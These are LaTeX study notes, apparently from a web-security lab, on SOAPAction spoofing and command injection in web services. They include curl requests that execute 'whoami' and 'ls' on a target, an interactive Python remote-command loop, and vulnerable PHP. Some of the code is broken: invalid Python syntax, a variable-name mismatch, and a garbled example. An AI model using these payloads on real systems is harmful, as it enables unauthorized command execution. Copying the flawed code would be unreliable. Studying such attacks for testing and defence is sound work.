\section{Web services attacks}



\subsection{SOAPAction spoofing}

SOAP messages towards a SOAP service should include both the operation and the
related parameters. This operation resides in the first child element of the
SOAP message's body. If HTTP is the transport of choice, it is allowed to use
an additional HTTP header called \verb+SOAPAction+, which contains the
operation's name. The receiving web service can identify the operation within
the SOAP body through this header without parsing any XML.

If a web service considers only the \verb+SOAPAction+ attribute when
determining the operation to execute, then it may be vulnerable to SOAPAction
spoofing.

in the wsdl 

\begin{verbatim}
<wsdl:operation name="ExecuteCommand">
      <soap:operation soapAction="ExecuteCommand" style="document"/>
\end{verbatim}

\begin{verbatim}
curl http://$TARGET/wsdl 
    --data-raw
    '<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope 
        xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" 
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  
        xmlns:tns="http://tempuri.org/" 
        xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">
        <soap:Body>
            <ExecuteCommandRequest xmlns="http://tempuri.org/">
                <cmd>whoami</cmd>
            </ExecuteCommandRequest>
        </soap:Body>
    </soap:Envelope>'
    -H 'SOAPAction: ExecuteCommand'
\end{verbatim}

the answer is :
\begin{verbatim}
 <?xml version="1.0" encoding="utf-8"?>
 <soap:Envelope 
    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  
    xmlns:tns="http://tempuri.org/" 
    xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">
 <soap:Body>
    <ExecuteCommandResponse xmlns="http://tempuri.org/">
        <success>false</success>
        <error>This function is only allowed in internal networks</error>
    </ExecuteCommandResponse>
 </soap:Body>
 </soap:Envelope>
\end{verbatim}


Modify the 
\begin{verbatim}
<ExecuteCommandRequest xmlns="http://tempuri.org/">
\end{verbatim}
by another service
\verb+<soap:Body><LoginRequest xmlns="http://tempuri.org/">+

and relaunch


Automate.py
\begin{verbatim}
import requests

target = IP:PORT

while True:
    cmd = input("$ ")
    payload = f'<?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" 
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  
        xmlns:tns="http://tempuri.org/" 
        xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">
        <soap:Body>
            <LoginRequest xmlns="http://tempuri.org/">
                <cmd>{cmd}</cmd>
            </LoginRequest>
        </soap:Body>
        </soap:Envelope>'
    print(requests.post("http://target/wsdl", 
            data=payload, 
            headers={"SOAPAction":'"ExecuteCommand"'}).content)
\end{verbatim}



\subsection{Command injection}
Command injections are among the most critical vulnerabilities in web services.
They allow system command execution directly on the back-end server. If a web
service uses user-controlled input to execute a system command on the back-end
server, an attacker may be able to inject a malicious payload to subvert the
intended command and execute his own.

Suppose we are assessing such a connectivity-checking service residing in
\verb+http://<TARGET IP>:3003/ping-server.php/ping+. Suppose we have also been
provided with the source code of the service.

Note: The web service we are about to assess does not follow the web service
architectural designs/approaches we covered. It is quite close to a normal web
service, though, as it provides its functionality in a programmatic way, and
different clients can use it for connectivity-checking purposes.

\begin{verbatim}
<?php
function ping($host_url_ip, $packets) {
        if (!in_array($packets, array(1, 2, 3, 4))) {
                die('Only 1-4 packets!');
        }
        $cmd = "ping -c" . $packets . " " . escapeshellarg($host_url);
        $delimiter = "\n" . str_repeat('-', 50) . "\n";
        echo $delimiter . implode($delimiter, array("Command:", $cmd, "Returned:", shell_exec($cmd)));
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        $prt = explode('/', $_SERVER['PATH_INFO']);
        call_user_func_array($prt[1], array_slice($prt, 2));
}
?>
\end{verbatim}

A function called ping is defined, which takes two arguments \verb+host_url_ip+
and \verb+packets+. The request should look similar to the following 
\verb+http://<TARGET IP>:3003/ping-server.php/ping/<VPN/TUN Adapter IP>/3+.

 i\verb+escapeshellarg()+ is used to escape the \verb+host_url+'s value. According to
 PHP's function reference, escapeshellarg() adds single quotes around a string
 and quotes/escapes any existing single quotes allowing you to pass a string
 directly to a shell function and having it be treated as a single safe
 argument. This function should be used to escape individual arguments to shell
 functions coming from user input. The shell functions include exec(), system()
 \verb+shell_exec()+ and the backtick operator. If the \verb+host_url+'s value was not
 escaped, the below could happen. 

 \begin{verbatim}
 ping google.com\iotad`
 \end{verbatim}


 \begin{verbatim}
 curl http://<TARGET IP>:3003/ping-server.php/system/ls+/
 \end{verbatim}
